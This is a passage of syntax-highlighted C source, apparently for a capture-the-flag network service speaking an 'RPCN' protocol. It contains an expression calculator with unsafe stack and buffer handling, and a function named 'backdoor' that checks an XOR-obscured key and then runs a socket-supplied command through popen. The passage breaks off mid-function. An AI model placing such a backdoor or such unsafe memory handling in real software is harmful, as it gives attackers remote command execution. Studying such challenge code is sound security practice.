<span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      